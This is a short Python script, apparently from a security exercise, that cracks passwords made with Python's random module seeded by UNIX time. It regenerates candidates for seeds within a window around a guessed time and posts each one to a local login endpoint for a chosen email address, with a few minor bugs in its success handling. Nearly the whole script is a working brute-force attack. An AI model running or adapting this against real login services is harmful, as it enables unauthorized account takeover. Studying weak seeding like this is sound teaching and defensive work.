import random
import time,requests

def generate_insecure_password(seed: int, length: int = 20) -> str:
    """Generate an insecure random password based on a given seed."""
    random.seed(seed)  # Use the provided seed to initialize the random number generator
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    password = ''.join(random.choice(characters) for _ in range(length))
    return password

def random_attack(approx_seed: int, length: int = 20, range_seconds: int = 5) -> str:
  
    print(f"Attempting to crack the password generated around seed: {approx_seed} within +/- {range_seconds} seconds")

    # Try all possible seeds in the range around the approximate seed and seding the request to the login page
    for offset in range(-range_seconds, range_seconds + 1):
        seed = approx_seed + offset
        guessed_password = generate_insecure_password(seed, length)
        response = requests.post("http://127.0.0.1:8000/login", data={'email': email, 'password': guessed_password})
        if "Access grated" in response.text:

            print(f"Password guessed {guessed_password}")

        
        

        print(f"Trying seed {seed}: {guessed_password}")
        
        #r = requests.post("http://127.0.0.1:8080/login",data=data)
        

    print("Password cracking attempt finished.")


    
    return None

if __name__ == "__main__":
   
    approx_seed = int(input("Enter the approximate UNIX time seed: "))
    email = (input("Enter the email for this attack: "))

    range_seconds = 20 # We can ajust this but the passwords list could be more bigger

    random_attack(approx_seed, length=20, range_seconds=range_seconds)
